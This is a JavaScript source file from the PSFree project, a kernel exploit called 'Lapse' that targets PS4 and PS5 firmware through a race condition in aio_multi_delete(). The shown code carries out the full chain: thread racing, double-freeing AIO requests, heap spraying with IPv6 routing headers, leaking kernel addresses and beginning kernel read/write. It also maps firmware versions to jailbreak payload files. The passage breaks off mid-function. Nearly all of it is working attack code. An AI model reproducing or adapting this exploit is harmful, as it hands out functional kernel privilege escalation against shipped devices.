/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

import { Int } from "./module/int64.mjs";
import { mem } from "./module/mem.mjs";
import { log, die, hex, hexdump } from "./module/utils.mjs";
import { cstr, jstr } from "./module/memtools.mjs";
import { page_size, context_size } from "./module/offset.mjs";
import { Chain } from "./module/chain.mjs";
import { View1, View2, View4, Word, Long, Pointer, Buffer } from "./module/view.mjs";
import * as rop from "./module/chain.mjs";
import * as config from "./config.mjs";

// static imports for firmware configurations
// import * as fw_ps4_700 from "./lapse/ps4/700.mjs";
// import * as fw_ps4_750 from "./lapse/ps4/750.mjs";
// import * as fw_ps4_751 from "./lapse/ps4/751.mjs";
import * as fw_ps4_800 from "./lapse/ps4/800.mjs";
import * as fw_ps4_850 from "./lapse/ps4/850.mjs";
import * as fw_ps4_852 from "./lapse/ps4/852.mjs";
import * as fw_ps4_900 from "./lapse/ps4/900.mjs";
import * as fw_ps4_903 from "./lapse/ps4/903.mjs";
import * as fw_ps4_950 from "./lapse/ps4/950.mjs";

const t1 = performance.now();

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
  const value = config.target;
  const is_ps4 = (value & 0x10000) === 0;
  const version = value & 0xffff;
  const [lower, upper] = (() => {
    if (is_ps4) {
      return [0x100, 0x1250];
    } else {
      return [0x100, 0x1020];
    }
  })();

  if (!(lower <= version && version < upper)) {
    throw RangeError(`invalid config.target: ${hex(value)}`);
  }

  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);

  return [is_ps4, version];
})();

// Pemetaan versi firmware ke file payload
const payloadMap = {
  // 0x700: "ps4-hen-700-vtx.bin", // 7.00
  // 0x701: "ps4-hen-700-vtx.bin", // 7.01
  // 0x702: "ps4-hen-700-vtx.bin", // 7.02
  // 0x750: "ps4-hen-750-vtx.bin", // 7.50
  // 0x751: "ps4-hen-751-vtx.bin", // 7.51
  // 0x755: "ps4-hen-751-vtx.bin", // 7.55
  0x800: "ps4-hen-800-vtx.bin", // 8.00
  0x801: "ps4-hen-800-vtx.bin", // 8.01
  0x803: "ps4-hen-803-vtx.bin", // 8.03
  0x850: "ps4-hen-850-vtx.bin", // 8.50
  0x852: "ps4-hen-852-vtx.bin", // 8.52
  0x900: "goldhen.bin", // 9.00
  0x903: "goldhen.bin", // 9.03
  0x904: "ps4-hen-904-vtx.bin", // 9.04
  0x950: "ps4-hen-950-vtx.bin", // 9.50
  0x951: "ps4-hen-951-vtx.bin", // 9.51
  0x960: "goldhen.bin", // 9.60
};

// Dapatkan nama file payload berdasarkan versi firmware
function getPayloadFile(version) {
  // if (0x700 <= version && version < 0x701) {
    // return payloadMap[0x700];
  // } else if (0x701 <= version && version < 0x702) {
    // return payloadMap[0x701];
  // } else if (0x702 <= version && version < 0x750) {
    // return payloadMap[0x702];
  // } else if (0x750 <= version && version < 0x751) {
    // return payloadMap[0x750];
  // } else if (0x751 <= version && version < 0x755) {
    // return payloadMap[0x751];
  // } else if (0x755 <= version && version < 0x800) {
    // return payloadMap[0x755];
  // } else 
	if (0x800 <= version && version < 0x801) {
    return payloadMap[0x800];
  } else if (0x801 <= version && version < 0x803) {
    return payloadMap[0x801];
  } else if (0x803 <= version && version < 0x850) {
    return payloadMap[0x803];
  } else if (0x850 <= version && version < 0x852) {
    return payloadMap[0x850];
  } else if (0x852 <= version && version < 0x900) {
    return payloadMap[0x852];
  } else if (0x900 <= version && version < 0x903) {
    return payloadMap[0x900];
  } else if (0x903 <= version && version < 0x904) {
    return payloadMap[0x903];
  } else if (0x904 <= version && version < 0x950) {
    return payloadMap[0x904];
  } else if (0x950 <= version && version < 0x951) {
    return payloadMap[0x950];
  } else if (0x951 <= version && version < 0x960) {
    return payloadMap[0x951];
  } else if (0x960 <= version && version < 0x1000) {
    return payloadMap[0x960];
  }
  throw new RangeError(`no payload available for firmware: ${hex(version)}`);
}

// set per-console/per-firmware offsets
const fw_config = (() => {
  if (is_ps4) {
    // if (0x700 <= version && version < 0x750) {
      // return fw_ps4_700;
    // } else if (0x750 <= version && version < 0x751) {
      // return fw_ps4_750;
    // } else if (0x751 <= version && version < 0x800) {
      // return fw_ps4_751;
    // } else 
	if (0x800 <= version && version < 0x850) {
      return fw_ps4_800;
    } else if (0x850 <= version && version < 0x852) {
      return fw_ps4_850;
    } else if (0x852 <= version && version < 0x900) {
      return fw_ps4_852;
    } else if (0x900 <= version && version < 0x903) {
      return fw_ps4_900;
    } else if (0x903 <= version && version < 0x950) {
      return fw_ps4_903;
     } else if (0x950 <= version && version < 0x1000) {
      return fw_ps4_950;
    }
  } else {
    // TODO: PS5
  }
  throw new RangeError(`unsupported: console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
})();

const pthread_offsets = fw_config.pthread_offsets;
const off_kstr = fw_config.off_kstr;
const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
const off_sysent_661 = fw_config.off_sysent_661;
const jmp_rsi = fw_config.jmp_rsi;
const patch_elf_loc = fw_config.patch_elf_loc;

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 0x0004;
const SO_LINGER = 0x0080;

// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

// netinet/tcp.h
const TCP_INFO = 32;
const sizeof_tcp_info_ = 0xec;

// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;

// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;
const sizeof_cpuset_t_ = 0x10;

// sys/mman.h
const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const PROT_EXEC = 0x04;
const MAP_SHARED = 0x0001;
const MAP_FIXED = 0x0010;
const MAP_ANON = 0x1000;
const MAP_PREFAULT_READ = 0x00040000;

// sys/rtprio.h
const RTP_LOOKUP = 0;
const RTP_SET = 1;
// const RTP_PRIO_ITHD = 1;
const RTP_PRIO_REALTIME = 2;
// const RTP_PRIO_NORMAL = 3;
// const RTP_PRIO_IDLE = 4;

// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
const max_aio_ids = 0x80;

// highest priority we can achieve given our credentials
const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

// CONFIG CONSTANTS
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = 10;
const num_races = 100;
const leak_len = 16;
const num_leaks = 5;
const num_clobbers = 8;

let chain = null;
let nogc = [];

async function init() {
  await rop.init();
  chain = new Chain();

  rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
}

function sys_void(...args) {
  return chain.syscall_void(...args);
}

function sysi(...args) {
  return chain.sysi(...args);
}

function call_nze(...args) {
  const res = chain.call_int(...args);
  if (res !== 0) {
    die(`call(${args[0]}) returned nonzero: ${res}`);
  }
}

function aio_submit_cmd(cmd, requests, num_requests, handles) {
  sysi("aio_submit_cmd", cmd, requests, num_requests, 3, handles);
}

const _aio_errors = new View4(max_aio_ids);
const _aio_errors_p = _aio_errors.addr;

function aio_multi_delete(ids, num_ids, sce_errs = _aio_errors_p) {
  sysi("aio_multi_delete", ids, num_ids, sce_errs);
}

function aio_multi_poll(ids, num_ids, sce_errs = _aio_errors_p) {
  sysi("aio_multi_poll", ids, num_ids, sce_errs);
}

function aio_multi_cancel(ids, num_ids, sce_errs = _aio_errors_p) {
  sysi("aio_multi_cancel", ids, num_ids, sce_errs);
}

function aio_multi_wait(ids, num_ids, sce_errs = _aio_errors_p) {
  sysi("aio_multi_wait", ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
  const reqs1 = new Buffer(0x28 * num_reqs);
  for (let i = 0; i < num_reqs; i++) {
    reqs1.write32(0x20 + i * 0x28, -1);
  }
  return reqs1;
}

function spray_aio(loops = 1, reqs1_p, num_reqs, ids_p, multi = true, cmd = AIO_CMD_READ) {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (let i = 0, idx = 0; i < loops; i++) {
    aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
    idx += step;
  }
}

function poll_aio(ids, states, num_ids = ids.length) {
  if (states !== undefined) {
    states = states.addr;
  }
  aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    aio_multi_cancel(ids_p.add((bi << 2) * len), len);
  }
  if (rem) {
    aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
  }
}

function free_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function free_aios2(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function get_cpu_affinity(mask) {
  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
}

function set_cpu_affinity(mask) {
  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
}

function pin_to_core(core) {
  const mask = new Buffer(sizeof_cpuset_t_);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}

function get_core_index(mask) {
  let num = mem.read32(mask.addr);
  let position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function get_current_core() {
  const mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_current_rtprio() {
  const _rtprio = new Buffer(4);
  sysi("rtprio_thread", RTP_LOOKUP, 0, _rtprio.addr);
  return {
    type: _rtprio.read16(0),
    prio: _rtprio.read16(2),
  };
}

function set_rtprio(rtprio_obj) {
  const _rtprio = new Buffer(4);
  _rtprio.write16(0, rtprio_obj.type);
  _rtprio.write16(2, rtprio_obj.prio);
  sysi("rtprio_thread", RTP_SET, 0, _rtprio.addr);
}

function close(fd) {
  sysi("close", fd);
}

function new_socket() {
  return sysi("socket", AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
  return sysi("socket", AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }

  sysi("getsockopt", sd, level, optname, optval.addr, size.addr);
  return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
  sysi("setsockopt", sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
  if (optlen === undefined) {
    optlen = optval.size;
  }

  const addr = optval.addr;
  setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
  return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
  ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
  }
}

function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;

  buf[0] = 0;
  buf[1] = len;
  buf[2] = 0;
  buf[3] = len >> 1;

  return size;
}

function spawn_thread(thread) {
  const ctx = new Buffer(context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  ctx.write64(0x38, thread.stack_addr);
  ctx.write64(0x80, thread.get_gadget("ret"));

  call_nze("pthread_create", pthread.addr, 0, chain.get_gadget("setcontext"), ctx.addr);

  return pthread;
}

// EXPLOIT STAGES IMPLEMENTATION

function make_aliased_rthdrs(sds) {
  const marker_offset = 4;
  const size = 0x80;
  const buf = new Buffer(size);
  const rsize = build_rthdr(buf, size);

  for (let loop = 0; loop < num_alias; loop++) {
    for (let i = 0; i < num_sds; i++) {
      buf.write32(marker_offset, i);
      set_rthdr(sds[i], buf, rsize);
    }

    for (let i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(marker_offset);
      if (marker !== i) {
        log(`aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}

function race_one(request_addr, tcp_sd, barrier, racer, sds) {
  const sce_errs = new View4([-1, -1]);
  const thr_mask = new Word(1 << main_core);

  const thr = racer;
  thr.push_syscall("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, thr_mask.addr);
  thr.push_syscall("rtprio_thread", RTP_SET, 0, rtprio.addr);
  thr.push_gadget("pop rax; ret");
  thr.push_value(1);
  thr.push_get_retval();
  thr.push_call("pthread_barrier_wait", barrier.addr);
  thr.push_syscall("aio_multi_delete", request_addr, 1, sce_errs.addr_at(1));
  thr.push_call("pthread_exit", 0);

  const pthr = spawn_thread(thr);
  const thr_tid = pthr.read32(0);

  while (thr.retval_int === 0) {
    sys_void("sched_yield");
  }

  chain.push_call("pthread_barrier_wait", barrier.addr);
  chain.push_syscall("sched_yield");
  chain.push_syscall("thr_suspend_ucontext", thr_tid);
  chain.push_get_retval();
  chain.push_get_errno();
  chain.push_end();
  chain.run();
  chain.reset();

  const main_res = chain.retval_int;
  log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);

  if (main_res === -1) {
    call_nze("pthread_join", pthr, 0);
    log();
    return null;
  }

  let won_race = false;
  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    log(`poll: ${hex(poll_err[0])}`);

    const info_buf = new View1(sizeof_tcp_info_);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    log(`info size: ${hex(info_size)}`);

    if (info_size !== sizeof_tcp_info_) {
      die(`info size isn't ${sizeof_tcp_info_}: ${info_size}`);
    }

    const tcp_state = info_buf[0];
    log(`tcp_state: ${tcp_state}`);

    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      won_race = true;
    }
  } finally {
    log("resume thread\n");
    sysi("thr_resume_ucontext", thr_tid);
    call_nze("pthread_join", pthr, 0);
  }

  if (won_race) {
    log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    if (sce_errs[0] !== sce_errs[1]) {
      log("ERROR: bad won_race");
      die("ERROR: bad won_race");
    }
    return make_aliased_rthdrs(sds);
  }

  return null;
}

function double_free_reqs2(sds) {
  function swap_bytes(x, byte_length) {
    let res = 0;
    for (let i = 0; i < byte_length; i++) {
      res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
    }
    return res >>> 0;
  }

  function htons(x) {
    return swap_bytes(x, 2);
  }

  function htonl(x) {
    return swap_bytes(x, 4);
  }

  const server_addr = new Buffer(16);
  server_addr[1] = AF_INET;
  server_addr.write16(2, htons(5050));
  server_addr.write32(4, htonl(0x7f000001));

  const racer = new Chain();
  const barrier = new Long();
  call_nze("pthread_barrier_init", barrier.addr, 0, 2);

  const num_reqs = 3;
  const which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs);
  const reqs1_p = reqs1.addr;
  const aio_ids = new View4(num_reqs);
  const aio_ids_p = aio_ids.addr;
  const req_addr = aio_ids.addr_at(which_req);
  const cmd = AIO_CMD_MULTI_READ;

  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));

  sysi("bind", sd_listen, server_addr.addr, server_addr.size);
  sysi("listen", sd_listen, 1);

  for (let i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi("connect", sd_client, server_addr.addr, server_addr.size);

    const sd_conn = sysi("accept", sd_listen, 0, 0);
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);

    aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
    aio_multi_cancel(aio_ids_p, num_reqs);
    aio_multi_poll(aio_ids_p, num_reqs);

    close(sd_client);

    const res = race_one(req_addr, sd_conn, barrier, racer, sds);
    racer.reset();

    aio_multi_delete(aio_ids_p, num_reqs);
    close(sd_conn);

    if (res !== null) {
      log(`won race at attempt: ${i}`);
      close(sd_listen);
      call_nze("pthread_barrier_destroy", barrier.addr);
      return res;
    }
  }

  die("failed aio double free");
}

function new_evf(flags) {
  const name = cstr("");
  return sysi("evf_create", name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
  sysi("evf_clear", id, 0);
  sysi("evf_set", id, flags);
}

function free_evf(id) {
  sysi("evf_delete", id);
}

function verify_reqs2(buf, offset) {
  if (buf.read32(offset) !== AIO_CMD_WRITE) {
    return false;
  }

  const heap_prefixes = [];
  for (let i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(buf.read16(offset + i + 4));
  }

  const state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
    return false;
  }

  if (!buf.read64(offset + 0x40).eq(0)) {
    return false;
  }

  for (let i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      if (buf.read16(offset + i + 4) !== 0xffff) {
        heap_prefixes.push(buf.read16(offset + i + 4));
      }
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
      return false;
    }
  }

  return heap_prefixes.every((e, i, a) => e === a[0]);
}

function leak_kernel_addrs(sd_pair) {
  close(sd_pair[1]);
  const sd = sd_pair[0];
  const buf = new Buffer(0x80 * leak_len);

  log("confuse evf with rthdr");
  let evf = null;
  for (let i = 0; i < num_alias; i++) {
    const evfs = [];
    for (let i = 0; i < num_handles; i++) {
      evfs.push(new_evf(0xf00 | (i << 16)));
    }

    get_rthdr(sd, buf, 0x80);
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];

    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);

    if ((buf.read32(0) === flags32) | 1) {
      evfs.splice(flags32 >> 16, 1);
    } else {
      evf = null;
    }

    for (const evf of evfs) {
      free_evf(evf);
    }

    if (evf !== null) {
      log(`confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }

  if (evf === null) {
    die("failed to confuse evf and rthdr");
  }

  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);

  const kernel_addr = buf.read64(0x28);
  log(`"evf cv" string addr: ${kernel_addr}`);
  const kbuf_addr = buf.read64(0x40).sub(0x38);
  log(`kernel buffer addr: ${kbuf_addr}`);

  const num_elems = 6;
  const ucred = kbuf_addr.add(4);

  const leak_reqs = make_reqs1(num_elems);
  const leak_reqs_p = leak_reqs.addr;
  leak_reqs.write64(0x10, ucred);

  const leak_ids_len = num_handles * num_elems;
  const leak_ids = new View4(leak_ids_len);
  const leak_ids_p = leak_ids.addr;

  log("find aio_entry");
  let reqs2_off = null;
  loop: for (let i = 0; i < num_leaks; i++) {
    get_rthdr(sd, buf);

    spray_aio(num_handles, leak_reqs_p, num_elems, leak_ids_p, true, AIO_CMD_WRITE);

    get_rthdr(sd, buf);
    for (let off = 0x80; off < buf.length; off += 0x80) {
      if (verify_reqs2(buf, off)) {
        reqs2_off = off;
        log(`found reqs2 at attempt: ${i}`);
        break loop;
      }
    }

    free_aios(leak_ids_p, leak_ids_len);
  }
  if (reqs2_off === null) {
    die("could not leak a reqs2");
  }
  log(`reqs2 offset: ${hex(reqs2_off)}`);

  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  log("leaked aio_entry:");
  hexdump(reqs2);

  const reqs1_addr = new Long(reqs2.read64(0x10));
  log(`reqs1_addr: ${reqs1_addr}`);
  reqs1_addr.lo &= -0x100;
  log(`reqs1_addr: ${reqs1_addr}`);

  log("searching target_id");
  let target_id = null;
  let to_cancel_p = null;
  let to_cancel_len = null;
  for (let i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);

    get_rthdr(sd, buf);
    const state = buf.read32(reqs2_off + 0x38);
    if (state === AIO_STATE_ABORTED) {
      log(`found target_id at batch: ${i / num_elems}`);

      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      log(`target_id: ${hex(target_id)}`);

      const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
      log("leaked aio_entry:");
      hexdump(reqs2);

      const start = i + num_elems;
      to_cancel_p = leak_ids.addr_at(start);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    die("target_id not found");
  }

  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios2(leak_ids_p, leak_ids_len);

  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}

function make_aliased_pktopts(sds) {
  const tclass = new Word();
  for (let loop = 0; loop < num_alias; loop++) {
    for (let i = 0; i < num_sds; i++) {
      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }

    for (let i = 0; i < num_sds; i++) {
      tclass[0] = i;
      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
    }

    for (let i = 0; i < sds.length; i++) {
      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        log(`aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        for (let i = 0; i < 2; i++) {
          const sd = new_socket();
          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
          sds.push(sd);
        }

        return pair;
      }
    }
  }
  die("failed to make aliased pktopts");
}

function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
  const max_leak_len = (0xff + 1) << 3;
  const buf = new Buffer(max_leak_len);

  const num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems);
  const aio_reqs_p = aio_reqs.addr;

  const num_batches = 2;
  const aio_ids_len = num_batches * num_elems;
  const aio_ids = new View4(aio_ids_len);
  const aio_ids_p = aio_ids.addr;

  log("start overwrite rthdr with AIO queue entry loop");
  let aio_not_found = true;
  free_evf(evf);
  for (let i = 0; i < num_clobbers; i++) {
    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);

    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      log(`aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids_len);
      break;
    }

    free_aios(aio_ids_p, aio_ids_len);
  }
  if (aio_not_found) {
    die("failed to overwrite rthdr");
  }

  const reqs2 = new Buffer(0x80);
  const rsize = build_rthdr(reqs2, reqs2.size);
  reqs2.write32(4, 5);
  reqs2.write64(0x18, reqs1_addr);
  const reqs3_off = 0x28;
  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));

  reqs2.write32(reqs3_off, 1);
  reqs2.write32(reqs3_off + 4, 0);
  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
  reqs2[reqs3_off + 0xc] = 0;
  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
  reqs2.write64(reqs3_off + 0x38, 1);

  const states = new View4(num_elems);
  const states_p = states.addr;
  const addr_cache = [aio_ids_p];
  for (let i = 1; i < num_batches; i++) {
    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
  }

  log("start overwrite AIO queue entry with rthdr loop");
  let req_id = null;
  close(sd);
  sd = null;
  loop: for (let i = 0; i < num_alias; i++) {
    for (const sd of sds) {
      set_rthdr(sd, reqs2, rsize);
    }

    for (let batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states_p);

      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        log(`req_idx: ${req_idx}`);
        log(`found req_id at batch: ${batch}`);
        log(`states: ${[...states].map((e) => hex(e))}`);
        log(`states[${req_idx}]: ${hex(states[req_idx])}`);
        log(`aliased at attempt: ${i}`);

        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        log(`req_id: ${hex(req_id)}`);
        aio_ids[aio_idx] = 0;

        poll_aio(req_id, states);
        log(`states[${req_idx}]: ${hex(states[0])}`);
        for (let i = 0; i < num_sds; i++) {
          const sd2 = sds[i];
          get_rthdr(sd2, reqs2);
          const done = reqs2[reqs3_off + 0xc];
          if (done) {
            hexdump(reqs2);
            sd = sd2;
            sds.splice(i, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (sd === null) {
          die("can't find sd that overwrote AIO queue entry");
        }
        log(`sd: ${sd}`);

        break loop;
      }
    }
  }
  if (req_id === null) {
    die("failed to overwrite AIO queue entry");
  }
  free_aios2(aio_ids_p, aio_ids_len);

  poll_aio(target_id, states);
  log(`target's state: ${hex(states[0])}`);

  const sce_errs = new View4([-1, -1]);
  const target_ids = new View4([req_id, target_id]);
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);

  try {
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);

    states[0] = -1;
    states[1] = -1;
    poll_aio(target_ids, states);
    log(`target states: ${hex(states[0])}, ${hex(states[1])}`);

    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    let success = true;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
      log("ERROR: bad delete of corrupt AIO request");
      success = false;
    }
    if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      log("ERROR: bad delete of ID pair");
      success = false;
    }

    if (!success) {
      die("ERROR: double free on a 0x100 malloc zone failed");
    }
  }
}

function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  const psd = pktopts_sds[0];
  const tclass = new Word();
  const off_tclass = is_ps4 ? 0xb0 : 0xc0;

  const pktopts = new Buffer(0x100);
  const rsize = build_rthdr(pktopts, pktopts.size);
  const pktinfo_p = k100_addr.add(0x10);
  pktopts.write64(0x10, pktinfo_p);

  log("overwrite main pktopts");
  let reclaim_sd = null;
  close(pktopts_sds[1]);
  for (let i = 0; i < num_alias; i++) {
    for (let i = 0; i < num_sds; i++) {
      pktopts.write32(off_tclass, 0x4141 | (i << 16));
      set_rthdr(sds[i], pktopts, rsize);
    }

    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    const marker = tclass[0];
    if ((marker & 0xffff) === 0x4141) {
      log(`found reclaim sd at attempt: ${i}`);
      const idx = marker >>> 16;
      reclaim_sd = sds[idx];
      sds.splice(idx, 1);
      break;
    }
  }
  if (reclaim_sd === null) {
    die("failed to overwrite main pktopts");
  }

  const pktinfo = new Buffer(0x14);
  pktinfo.write64(0, pktinfo_p);
  const nhop = new Word();
  const nhop_p = nhop.addr;
